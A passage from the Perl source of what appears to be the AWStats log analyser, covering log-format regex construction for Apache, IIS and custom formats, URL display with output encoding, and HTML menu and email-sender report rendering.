		#		my $function="ShowInfoURL_$pluginname('$url')";
		#		eval("$function");
		my $function = "ShowInfoURL_$pluginname";
		&$function($url);
	}

	if ( length($nompage) > $MaxLengthOfShownURL ) {
		$nompage = substr( $nompage, 0, $MaxLengthOfShownURL ) . "...";
	}
	if ($ShowLinksOnUrl) {
		my $newkey = CleanXSS($url);
		if ( $LogType eq 'W' || $LogType eq 'S' ) {  # Web or streaming log file
			if ( $newkey =~ /^http(s|):/i )
			{    # URL seems to be extracted from a proxy log file
				print "<a href=\""
				  . XMLEncode("$newkey")
				  . "\" target=\"url\" rel=\"nofollow noopener noreferrer\">"
				  . XMLEncode($nompage) . "</a>";
			}
			elsif ( $newkey =~ /^\// )
			{ # URL seems to be an url extracted from a web or wap server log file
				$newkey =~ s/^\/$SiteDomain//i;

				# Define urlprot
				my $urlprot = 'http';
				if ( $UseHTTPSLinkForUrl && $newkey =~ /^$UseHTTPSLinkForUrl/ )
				{
					$urlprot = 'https';
				}
				print "<a href=\""
				  . XMLEncode("$urlprot://$SiteDomain$newkey")
				  . "\" target=\"url\" rel=\"nofollow noopener noreferrer\">"
				  . XMLEncode($nompage) . "</a>";
			}
			else {
				print XMLEncode($nompage);
			}
		}
		elsif ( $LogType eq 'F' ) {    # Ftp log file
			print XMLEncode($nompage);
		}
		elsif ( $LogType eq 'M' ) {    # Smtp log file
			print XMLEncode($nompage);
		}
		else {                         # Other type log file
			print XMLEncode($nompage);
		}
	}
	else {
		print XMLEncode($nompage);
	}
}

#------------------------------------------------------------------------------
# Function:     Define value for PerlParsingFormat (used for regex log record parsing)
# Parameters:   $LogFormat
# Input:        -
# Output:       $pos_xxx, @pos_extra, @fieldlib, $PerlParsingFormat
# Return:       -
#------------------------------------------------------------------------------
sub DefinePerlParsingFormat {
	my $LogFormat = shift;
	$pos_vh = $pos_host = $pos_logname = $pos_date = $pos_tz = $pos_method =
	  $pos_url = $pos_code = $pos_size = $pos_time = -1;
	$pos_referer = $pos_agent = $pos_query = $pos_gzipin = $pos_gzipout =
	  $pos_compratio   = -1;
	$pos_cluster       = $pos_emails = $pos_emailr = $pos_hostr = -1;
	@pos_extra         = ();
	@fieldlib          = ();
	$PerlParsingFormat = '';

# Log records examples:
# Apache combined:             62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] "GET / HTTP/1.1" 200 1234 "http://www.from.com/from.htm" "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
# Apache combined (408 error): my.domain.com - user [09/Jan/2001:11:38:51 -0600] "OPTIONS /mime-tmp/xxx file.doc HTTP/1.1" 408 - "-" "-"
# Apache combined (408 error): 62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] "-" 408 - "-" "-"
# Apache combined (400 error): 80.8.55.11 - - [28/Apr/2007:03:20:02 +0200] "GET /" 400 584 "-" "-"
# IIS:                         2000-07-19 14:14:14 62.161.78.73 - GET / 200 1234 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) http://www.from.com/from.htm
# WebStar:                     05/21/00	00:17:31	OK  	200	212.242.30.6	Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)	http://www.cover.dk/	"www.cover.dk"	:Documentation:graphics:starninelogo.white.gif	1133
# Squid extended:              12.229.91.170 - - [27/Jun/2002:03:30:50 -0700] "GET http://www.callistocms.com/images/printable.gif HTTP/1.1" 304 354 "-" "Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0" TCP_REFRESH_HIT:DIRECT
# Log formats:
# Apache common_with_mod_gzip_info1: %h %l %u %t \"%r\" %>s %b mod_gzip: %{mod_gzip_compression_ratio}npct.
# Apache common_with_mod_gzip_info2: %h %l %u %t \"%r\" %>s %b mod_gzip: %{mod_gzip_result}n In:%{mod_gzip_input_size}n Out:%{mod_gzip_output_size}n:%{mod_gzip_compression_ratio}npct.
# Apache deflate: %h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" (%{ratio}n)
	if ($Debug) {
		debug(
"Call To DefinePerlParsingFormat (LogType='$LogType', LogFormat='$LogFormat')"
		);
	}
	if ( $LogFormat =~ /^[1-6]$/ ) {    # Pre-defined log format
		if ( $LogFormat eq '1' || $LogFormat eq '6' )
		{ # Same than "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"".
			 # %u (user) is "([^\\/\\[]+)" instead of "[^ ]+" because can contain space (Lotus Notes). referer and ua might be "".

# $PerlParsingFormat="([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) (.+) [^\\\"]+\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
			$PerlParsingFormat =
"([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) ([^ ]+)(?: [^\\\"]+|)\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
			$pos_host    = 0;
			$pos_logname = 1;
			$pos_date    = 2;
			$pos_method  = 3;
			$pos_url     = 4;
			$pos_code    = 5;
			$pos_size    = 6;
			$pos_referer = 7;
			$pos_agent   = 8;
			@fieldlib    = (
				'host', 'logname', 'date', 'method', 'url', 'code',
				'size', 'referer', 'ua'
			);
		}
		elsif ( $LogFormat eq '2' )
		{ # Same than "date time c-ip cs-username cs-method cs-uri-stem sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)"
			$PerlParsingFormat =
"(\\S+ \\S+) (\\S+) (\\S+) (\\S+) (\\S+) ([\\d|-]+) ([\\d|-]+) \\S+ (\\S+) (\\S+)";
			$pos_date    = 0;
			$pos_host    = 1;
			$pos_logname = 2;
			$pos_method  = 3;
			$pos_url     = 4;
			$pos_code    = 5;
			$pos_size    = 6;
			$pos_agent   = 7;
			$pos_referer = 8;
			@fieldlib    = (
				'date', 'host', 'logname', 'method', 'url', 'code',
				'size', 'ua',   'referer'
			);
		}
		elsif ( $LogFormat eq '3' ) {
			$PerlParsingFormat =
"([^\\t]*\\t[^\\t]*)\\t([^\\t]*)\\t([\\d|-]*)\\t([^\\t]*)\\t([^\\t]*)\\t([^\\t]*)\\t[^\\t]*\\t([^\\t]*)\\t([\\d]*)";
			$pos_date    = 0;
			$pos_method  = 1;
			$pos_code    = 2;
			$pos_host    = 3;
			$pos_agent   = 4;
			$pos_referer = 5;
			$pos_url     = 6;
			$pos_size    = 7;
			@fieldlib    = (
				'date', 'method',  'code', 'host',
				'ua',   'referer', 'url',  'size'
			);
		}
		elsif ( $LogFormat eq '4' ) {    # Same than "%h %l %u %t \"%r\" %>s %b"
			# %u (user) is "(.+)" instead of "[^ ]+" because can contain space (Lotus Notes).
			# Sample: 10.100.10.45 - BMAA\will.smith [01/Jul/2013:07:17:28 +0200] "GET /Download/__Omnia__Aus- und Weiterbildung__Konsular- und Verwaltungskonferenz, Programm.doc HTTP/1.1" 200 9076810
#			$PerlParsingFormat = 
#"([^ ]+) [^ ]+ (.+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) ([^ ]+)(?: [^\\\"]+|)\\\" ([\\d|-]+) ([\\d|-]+)";
			$PerlParsingFormat = 
"([^ ]+) [^ ]+ (.+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) (.+) [^\\\"]+\\\" ([\\d|-]+) ([\\d|-]+)";
			$pos_host    = 0;
			$pos_logname = 1;
			$pos_date    = 2;
			$pos_method  = 3;
			$pos_url     = 4;
			$pos_code    = 5;
			$pos_size    = 6;
			@fieldlib    =
			  ( 'host', 'logname', 'date', 'method', 'url', 'code', 'size' );
		}
	}
    elsif ( $LogFormat eq 'json' ) {
        $PerlParsingFormat = 'json';
        $PerlParsingFormatJsonMap = JSON::XS->new->utf8->decode($LogFormatJsonMap);
        @fieldlib = keys % {$PerlParsingFormatJsonMap};
        for my $i (0 .. $#fieldlib) {
            my $f_name = $fieldlib[$i];
            my $pos_var_suf = $f_name;
            if ($f_name =~ /time[12]/) {
                $pos_var_suf = "date";
            } elsif ($f_name =~  /extra([0-9]+)/) {
                $pos_var_suf =~ s/extra//;
                $pos_extra[$pos_var_suf] = $i;
                next;
            }
            my $k = "pos_$pos_var_suf";
            $$k = $i;
        }
    }
	else {    # Personalized log format
		my $LogFormatString = $LogFormat;

		# Replacement for Notes format string that are not Apache
		$LogFormatString =~ s/%vh/%virtualname/g;

		# Replacement for Apache format string
		$LogFormatString =~ s/%v(\s)/%virtualname$1/g;
		$LogFormatString =~ s/%v$/%virtualname/g;
		$LogFormatString =~ s/%h(\s)/%host$1/g;
		$LogFormatString =~ s/%h$/%host/g;
		$LogFormatString =~ s/%l(\s)/%other$1/g;
		$LogFormatString =~ s/%l$/%other/g;
		$LogFormatString =~ s/\"%u\"/%lognamequot/g;
		$LogFormatString =~ s/%u(\s)/%logname$1/g;
		$LogFormatString =~ s/%u$/%logname/g;
		$LogFormatString =~ s/%t(\s)/%time1$1/g;
		$LogFormatString =~ s/%t$/%time1/g;
		$LogFormatString =~ s/\"%r\"/%methodurl/g;
		$LogFormatString =~ s/%>s/%code/g;
		$LogFormatString =~ s/%b(\s)/%bytesd$1/g;
		$LogFormatString =~ s/%b$/%bytesd/g;
		$LogFormatString =~ s/\"%\{Referer}i\"/%refererquot/g;
		$LogFormatString =~ s/\"%\{User-Agent}i\"/%uaquot/g;
		$LogFormatString =~ s/%\{mod_gzip_input_size}n/%gzipin/g;
		$LogFormatString =~ s/%\{mod_gzip_output_size}n/%gzipout/g;
		$LogFormatString =~ s/%\{mod_gzip_compression_ratio}n/%gzipratio/g;
		$LogFormatString =~ s/\(%\{ratio}n\)/%deflateratio/g;

		# Replacement for a IIS and ISA format string
		$LogFormatString =~ s/cs-uri-query/%query/g;    # Must be before cs-uri
		$LogFormatString =~ s/date\stime/%time2/g;
		$LogFormatString =~ s/c-ip/%host/g;
		$LogFormatString =~ s/cs-username/%logname/g;
		$LogFormatString =~ s/cs-method/%method/g;  # GET, POST, SMTP, RETR STOR
		$LogFormatString =~ s/cs-uri-stem/%url/g;
		$LogFormatString =~ s/cs-uri/%url/g;
		$LogFormatString =~ s/sc-status/%code/g;
		$LogFormatString =~ s/sc-bytes/%bytesd/g;
		$LogFormatString =~ s/cs-version/%other/g;  # Protocol
		$LogFormatString =~ s/cs\(User-Agent\)/%ua/g;
		$LogFormatString =~ s/c-agent/%ua/g;
		$LogFormatString =~ s/cs\(Referer\)/%referer/g;
		$LogFormatString =~ s/cs-referred/%referer/g;
		$LogFormatString =~ s/sc-authenticated/%other/g;
		$LogFormatString =~ s/s-svcname/%other/g;
		$LogFormatString =~ s/s-computername/%other/g;
		$LogFormatString =~ s/r-host/%virtualname/g;
		$LogFormatString =~ s/cs-host/%virtualname/g;
		$LogFormatString =~ s/r-ip/%other/g;
		$LogFormatString =~ s/r-port/%other/g;
		$LogFormatString =~ s/time-taken/%other/g;
		$LogFormatString =~ s/cs-bytes/%other/g;
		$LogFormatString =~ s/cs-protocol/%other/g;
		$LogFormatString =~ s/cs-transport/%other/g;
		$LogFormatString =~
		  s/s-operation/%method/g;    # GET, POST, SMTP, RETR STOR
		$LogFormatString =~ s/cs-mime-type/%other/g;
		$LogFormatString =~ s/s-object-source/%other/g;
		$LogFormatString =~ s/s-cache-info/%other/g;
		$LogFormatString =~ s/cluster-node/%cluster/g;
		$LogFormatString =~ s/s-sitename/%other/g;
		$LogFormatString =~ s/s-ip/%other/g;
		$LogFormatString =~ s/s-port/%other/g;
		$LogFormatString =~ s/cs\(Cookie\)/%other/g;
		$LogFormatString =~ s/sc-substatus/%other/g;
		$LogFormatString =~ s/sc-win32-status/%other/g;


		# Added for MMS
		$LogFormatString =~
		  s/protocol/%protocolmms/g;    # cs-method might not be available
		$LogFormatString =~
		  s/c-status/%codemms/g;    # c-status used when sc-status not available
		if ($Debug) { debug(" LogFormatString=$LogFormatString"); }

# $LogFormatString has an AWStats format, so we can generate PerlParsingFormat variable
		my $i                       = 0;
		my $LogSeparatorWithoutStar = $LogSeparator;
		$LogSeparatorWithoutStar =~ s/[\*\+]//g;
		foreach my $f ( split( /\s+/, $LogFormatString ) ) {

			# Add separator for next field
			if ($PerlParsingFormat) { $PerlParsingFormat .= "$LogSeparator"; }

			# If field is prefixed with custom string, just push it to regex literally
			if ( $f =~ /^([^%]+)%/ ) {
				$PerlParsingFormat .= "$1"
                        }

			# Special for logname
			if ( $f =~ /%lognamequot$/ ) {
				$pos_logname = $i;
				$i++;
				push @fieldlib, 'logname';
				$PerlParsingFormat .=
				  "\\\"?([^\\\"]*)\\\"?"
				  ; # logname can be "value", "" and - in same log (Lotus notes)
			}
			elsif ( $f =~ /%logname$/ ) {
				$pos_logname = $i;
				$i++;
				push @fieldlib, 'logname';

# %u (user) is "([^\\/\\[]+)" instead of "[^$LogSeparatorWithoutStar]+" because can contain space (Lotus Notes).
				$PerlParsingFormat .= "([^\\/\\[]+)";
			}

			# Date format
			elsif ( $f =~ /%time1$/ || $f =~ /%time1b$/ )
			{ # [dd/mmm/yyyy:hh:mm:ss +0000] or [dd/mmm/yyyy:hh:mm:ss],  time1b kept for backward compatibility
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$pos_tz = $i;
				$i++;
				push @fieldlib, 'tz';
				$PerlParsingFormat .=
"\\[([^$LogSeparatorWithoutStar]+)( [^$LogSeparatorWithoutStar]+)?\\]";
			}
			elsif ( $f =~ /%time2$/ ) {    # yyyy-mm-dd hh:mm:ss
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$PerlParsingFormat .=
"([^$LogSeparatorWithoutStar]+\\s[^$LogSeparatorWithoutStar]+)";                        # Need \s for Exchange log files
			}
			elsif ( $f =~ /%time3$/ )
			{ # mon d hh:mm:ss  or  mon  d hh:mm:ss  or  mon dd hh:mm:ss yyyy  or  day mon dd hh:mm:ss  or  day mon dd hh:mm:ss yyyy
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$PerlParsingFormat .=
"(?:\\w\\w\\w )?(\\w\\w\\w \\s?\\d+ \\d\\d:\\d\\d:\\d\\d(?: \\d\\d\\d\\d)?)";
			}
			elsif ( $f =~ /%time4$/ ) {    # ddddddddddddd
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$PerlParsingFormat .= "(\\d+)";
			}
			elsif ( $f =~ /%time5$/ ) {
				# Supports the following formats:
				# - yyyy-mm-ddThh:mm:ss           (Incomplete ISO 8601)
				# - yyyy-mm-ddThh:mm:ssZ          (ISO 8601, zero meridian)
				# - yyyy-mm-ddThh:mm:ss+00:00     (ISO 8601)
				# - yyyy-mm-ddThh:mm:ss+0000      (Apache's best approximation to ISO 8601 using "%{%Y-%m-%dT%H:%M:%S%z}t" in LogFormat)
				# - yyyy-mm-ddThh:mm:ss.000000Z   (Amazon AWS log files)
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$pos_tz = $i;
				$i++;
				push @fieldlib, 'tz';
				$PerlParsingFormat .=
"([^$LogSeparatorWithoutStar]+T[^$LogSeparatorWithoutStar]+)(Z|[-+\.]\\d\\d[:\\.\\dZ]*)?";
			}
			elsif ( $f =~ /%time6$/ ) {	# dd/mm/yyyy, hh:mm:ss - added additional type to format for IIS date -DWG 12/8/2008
				$pos_date = $i;	
				$i++; 
				push @fieldlib, 'date';
				$PerlParsingFormat .= "([^,]+,[^,]+)";
			}

			# Special for methodurl, methodurlprot and methodurlnoprot
			elsif ( $f =~ /%methodurl$/ ) {
				$pos_method = $i;
				$i++;
				push @fieldlib, 'method';
				$pos_url = $i;
				$i++;
				push @fieldlib, 'url';
				$PerlParsingFormat .=

#"\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+) [^\\\"]+\\\"";
"\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)(?: [^\\\"]+|)\\\"";
			}
			elsif ( $f =~ /%methodurlprot$/ ) {
				$pos_method = $i;
				$i++;
				push @fieldlib, 'method';
				$pos_url = $i;
				$i++;
				push @fieldlib, 'url';
				$PerlParsingFormat .=
"\\\"([^$LogSeparatorWithoutStar]+) ([^\\\"]+) ([^\\\"]+)\\\"";
			}
			elsif ( $f =~ /%methodurlnoprot$/ ) {
				$pos_method = $i;
				$i++;
				push @fieldlib, 'method';
				$pos_url = $i;
				$i++;
				push @fieldlib, 'url';
				$PerlParsingFormat .=
"\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)\\\"";
			}

			# Common command tags
			elsif ( $f =~ /%virtualnamequot$/ ) {
				$pos_vh = $i;
				$i++;
				push @fieldlib, 'vhost';
				$PerlParsingFormat .= "\\\"([^$LogSeparatorWithoutStar]+)\\\"";
			}
			elsif ( $f =~ /%virtualname$/ ) {
				$pos_vh = $i;
				$i++;
				push @fieldlib, 'vhost';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%host_r$/ ) {
				$pos_hostr = $i;
				$i++;
				push @fieldlib, 'hostr';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%host$/ ) {
				$pos_host = $i;
				$i++;
				push @fieldlib, 'host';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%host_proxy$/ )
			{    # if host_proxy tag used, host tag must not be used
				$pos_host = $i;
				$i++;
				push @fieldlib, 'host';
				$PerlParsingFormat .= "(.+?)(?:, .*)*";
			}
			elsif ( $f =~ /%method$/ ) {
				$pos_method = $i;
				$i++;
				push @fieldlib, 'method';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%url$/ ) {
				$pos_url = $i;
				$i++;
				push @fieldlib, 'url';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%query$/ ) {
				$pos_query = $i;
				$i++;
				push @fieldlib, 'query';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%code$/ ) {
				$pos_code = $i;
				$i++;
				push @fieldlib, 'code';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%bytesd$/ ) {
				$pos_size = $i;
				$i++;
				push @fieldlib, 'size';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
                        elsif ( $f =~ /%rqtime$/ ) {
                                $pos_time = $i;
                                $i++;
                                push @fieldlib, 'requesttime';
                                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
                        }
			elsif ( $f =~ /%refererquot$/ ) {
				$pos_referer = $i;
				$i++;
				push @fieldlib, 'referer';
				$PerlParsingFormat .=
				  "\\\"([^\\\"]*)\\\"";    # referer might be ""
			}
			elsif ( $f =~ /%referer$/ ) {
				$pos_referer = $i;
				$i++;
				push @fieldlib, 'referer';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%uaquot$/ ) {
				$pos_agent = $i;
				$i++;
				push @fieldlib, 'ua';
				$PerlParsingFormat .= "\\\"([^\\\"]*)\\\"";    # ua might be ""
			}
			elsif ( $f =~ /%uabracket$/ ) {
				$pos_agent = $i;
				$i++;
				push @fieldlib, 'ua';
				$PerlParsingFormat .= "\\\[([^\\\]]*)\\\]";    # ua might be []
			}
			elsif ( $f =~ /%ua$/ ) {
				$pos_agent = $i;
				$i++;
				push @fieldlib, 'ua';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%gzipin$/ ) {
				$pos_gzipin = $i;
				$i++;
				push @fieldlib, 'gzipin';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%gzipout/ )
			{ # Compare $f to /%gzipout/ and not to /%gzipout$/ like other fields
				$pos_gzipout = $i;
				$i++;
				push @fieldlib, 'gzipout';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%gzipratio/ )
			{ # Compare $f to /%gzipratio/ and not to /%gzipratio$/ like other fields
				$pos_compratio = $i;
				$i++;
				push @fieldlib, 'gzipratio';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%deflateratio/ )
			{ # Compare $f to /%deflateratio/ and not to /%deflateratio$/ like other fields
				$pos_compratio = $i;
				$i++;
				push @fieldlib, 'deflateratio';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%email_r$/ ) {
				$pos_emailr = $i;
				$i++;
				push @fieldlib, 'email_r';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%email$/ ) {
				$pos_emails = $i;
				$i++;
				push @fieldlib, 'email';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%cluster$/ ) {
				$pos_cluster = $i;
				$i++;
				push @fieldlib, 'clusternb';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%timetaken$/ ) {
				$pos_timetaken = $i;
				$i++;
				push @fieldlib, 'timetaken';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}

# Special for protocolmms, used for method if method not already found (for MMS)
			elsif ( $f =~ /%protocolmms$/ ) {
				if ( $pos_method < 0 ) {
					$pos_method = $i;
					$i++;
					push @fieldlib, 'method';
					$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
				}
			}

   # Special for codemms, used for code only if code not already found (for MMS)
			elsif ( $f =~ /%codemms$/ ) {
				if ( $pos_code < 0 ) {
					$pos_code = $i;
					$i++;
					push @fieldlib, 'code';
					$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
				}
			}

			# Extra tag
			elsif ( $f =~ /%extra(\d+)$/ ) {
				$pos_extra[$1] = $i;
				$i++;
				push @fieldlib, "extra$1";
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}

			# Other tag
			elsif ( $f =~ /%other$/ ) {
				$PerlParsingFormat .= "[^$LogSeparatorWithoutStar]+";
			}
			elsif ( $f =~ /%otherquot$/ ) {
				$PerlParsingFormat .= "\\\"[^\\\"]*\\\"";
			}

			# Unknown tag (no parenthesis)
			else {
				$PerlParsingFormat .= "[^$LogSeparatorWithoutStar]+";
			}
		}
		if ( !$PerlParsingFormat ) {
			error("No recognized format tag in personalized LogFormat string");
		}
	}
	if ( $pos_host < 0 ) {
		error(
"Your personalized LogFormat does not include all fields required by AWStats (Add \%host in your LogFormat string)."
		);
	}
	if ( $pos_date < 0 ) {
		error(
"Your personalized LogFormat does not include all fields required by AWStats (Add \%time1 or \%time2 in your LogFormat string)."
		);
	}
	if ( $pos_method < 0 ) {
		error(
"Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%method in your LogFormat string)."
		);
	}
	if ( $pos_url < 0 ) {
		error(
"Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%url in your LogFormat string)."
		);
	}
	if ( $pos_code < 0 ) {
		error(
"Your personalized LogFormat does not include all fields required by AWStats (Add \%code in your LogFormat string)."
		);
	}
#	if ( $pos_size < 0 ) {
#		error(
#"Your personalized LogFormat does not include all fields required by AWStats (Add \%bytesd in your LogFormat string)."
#		);
#	}
	$PerlParsingFormat = qr/^$PerlParsingFormat/;
	if ($Debug) { debug(" PerlParsingFormat is $PerlParsingFormat"); }
}

#------------------------------------------------------------------------------
# Function:     Prints a menu category for the frame or static header
# Parameters:   -
# Input:        $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,
#				$NewLinkParams, $NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowMenuCateg {
	my ( $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,
		$NewLinkParams, $NewLinkTarget )
	  = ( shift, shift, shift, shift, shift, shift, shift, shift );
	$categicon = '';    # Comment this to enabme category icons
	my ( $menu, $menulink, $menutext ) = ( shift, shift, shift );
	my $linetitle = 0;

	# Call to plugins' function AddHTMLMenuLink
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuLink'} } ) {

# my $function="AddHTMLMenuLink_$pluginname('$categ',\$menu,\$menulink,\$menutext)";
# eval("$function");
		my $function = "AddHTMLMenuLink_$pluginname";
		&$function( $categ, $menu, $menulink, $menutext );
	}
	foreach my $key (%$menu) {
		if ( $menu->{$key} && $menu->{$key} > 0 ) { $linetitle++; last; }
	}
	if ( !$linetitle ) { return; }

# At least one entry in menu for this category, we can show category and entries
	my $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );
	print "<tr><td class=\"awsm\" width=\"$WIDTHMENU1\""
	  . ( $frame ? "" : " valign=\"top\"" ) . ">"
	  . ( $categicon ? "<img src=\"$DirIcons/other/$categicon\" />&nbsp;" : "" )
	  . "<b>$categtext:</b></td>\n";
	print( $frame? "</tr>\n" : "<td class=\"awsm\">" );
	foreach my $key ( sort { $menu->{$a} <=> $menu->{$b} } keys %$menu ) {
		if ( $menu->{$key} == 0 )     { next; }
		if ( $menulink->{$key} == 1 ) {
			print( $frame? "<tr><td class=\"awsm\">" : "" );
			print
			  "<a href=\"$linkanchor#$key\"$targetpage>$menutext->{$key}</a>";
			print( $frame? "</td></tr>\n" : " &nbsp; " );
		}
		if ( $menulink->{$key} == 2 ) {
			print( $frame
				? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
				: ""
			);
			print "<a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'}
				  || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=$key")
				: "$StaticLinks.$key.$StaticExt"
			  )
			  . "\"$NewLinkTarget>$menutext->{$key}</a>\n";
			print( $frame? "</td></tr>\n" : " &nbsp; " );
		}
	}
	print( $frame? "" : "</td></tr>\n" );
}

#------------------------------------------------------------------------------
# Function:     Prints HTML to display an email senders chart
# Parameters:   -
# Input:        $NewLinkParams, NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowEmailSendersChart {
	my $NewLinkParams         = shift;
	my $NewLinkTarget         = shift;
	my $MaxLengthOfShownEMail = 48;

	my $total_p;
	my $total_h;
	my $total_k;
	my $max_p;
	my $max_h;
	my $max_k;
	my $rest_p;
	my $rest_h;
	my $rest_k;

	# Show filter form
	#&ShowFormFilter("emailsfilter",$EmailsFilter);
	# Show emails list

	print "$Center<a name=\"emailsenders\">&nbsp;</a><br />\n";
	my $title;
	if ( $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} ) {
		$title = _t("Email Senders");
	}
	else {
		$title = _t("Email Senders") . " (" . _t("Top") . " $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'}
			  || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=allemails")
			: "$StaticLinks.allemails.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
		if ( $ShowEMailSenders =~ /L/i ) {
			$title .= " &nbsp; - &nbsp; <a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'}
				  || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=lastemails")
				: "$StaticLinks.lastemails.$StaticExt"
			  )
			  . "\"$NewLinkTarget>" . _t("Last") . "</a>";
		}
	}
	&tab_head( "$title", 19, 0, 'emailsenders' );
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"3\">" . _t("Email Senders") . " : "
	  . ( scalar keys %_emails_h ) . "</th>";
	if ( $ShowEMailSenders =~ /H/i ) {
		print "<th rowspan=\"2\" bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>";
	}
	if ( $ShowEMailSenders =~ /B/i ) {
		print
"<th class=\"datasize\" rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowEMailSenders =~ /M/i ) {
		print
"<th rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>";
	}
	if ( $ShowEMailSenders =~ /L/i ) {
		print "<th rowspan=\"2\" width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"30%\">Local</th><th>&nbsp;</th><th width=\"30%\">External</th></tr>";
	$total_p = $total_h = $total_k = 0;
	$max_h = 1;
	foreach ( values %_emails_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	$max_k = 1;
	foreach ( values %_emails_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	if ( !$HTMLOutput{'allemails'} && !$HTMLOutput{'lastemails'} ) {
		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emails_h,
			\%_emails_h );
	}
	if ( $HTMLOutput{'allemails'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emails_h,
			\%_emails_h );
	}
	if ( $HTMLOutput{'lastemails'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emails_h,
			\%_emails_l );
	}
	foreach my $key (@keylist) {
		my $newkey = $key;
		if ( length($key) > $MaxLengthOfShownEMail ) {
